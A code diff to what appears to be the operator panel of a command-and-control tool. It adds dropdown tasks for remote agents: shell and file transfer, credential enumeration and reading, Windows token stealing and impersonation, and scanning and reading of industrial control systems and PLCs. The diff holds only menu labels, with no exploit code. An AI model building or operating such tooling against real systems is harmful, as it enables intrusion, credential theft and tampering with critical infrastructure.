@@ -325,8 +325,14 @@ tr.selected td{background:rgba(59,130,246,.1)}
       <div class="cmd-bar">
         <select id="cmd-type">
           <option value="shell">shell</option>
+          <option value="whoami">whoami</option>
+          <option value="getuid">getuid</option>
+          <option value="getgid">getgid</option>
           <option value="upload">upload</option>
           <option value="download">download</option>
+          <option value="download_stat">download_stat</option>
+          <option value="download_chunk">download_chunk</option>
+          <option value="upload_chunk">upload_chunk</option>
           <option value="ls">ls</option>
           <option value="ps">ps</option>
           <option value="kill">kill</option>
@@ -344,6 +350,26 @@ tr.selected td{background:rgba(59,130,246,.1)}
           <option value="pwd">pwd</option>
           <option value="cd">cd</option>
           <option value="resolve">resolve</option>
+          <option value="ot_discover">ot_discover</option>
+          <option value="ot_fingerprint">ot_fingerprint</option>
+          <option value="ot_vuln_scan">ot_vuln_scan</option>
+          <option value="ot_hmi">ot_hmi</option>
+          <option value="ot_historian">ot_historian</option>
+          <option value="ot_wireless">ot_wireless</option>
+          <option value="ot_serial">ot_serial</option>
+          <option value="ot_plc_read">ot_plc_read</option>
+          <option value="ot_credentials">ot_credentials</option>
+          <option value="credential_enum">credential_enum</option>
+          <option value="credential_read">credential_read</option>
+          <option value="process_info">process_info</option>
+          <option value="process_suspend">process_suspend</option>
+          <option value="process_resume">process_resume</option>
+          <option value="token_list">token_list</option>
+          <option value="token_steal">token_steal</option>
+          <option value="token_make">token_make</option>
+          <option value="token_impersonate">token_impersonate</option>
+          <option value="token_revert">token_revert</option>
+          <option value="getprivs">getprivs</option>
         </select>
         <input type="text" id="cmd-args" placeholder="command arguments..." onkeydown="if(event.key==='Enter')sendTask()">
         <button onclick="sendTask()">Execute</button>
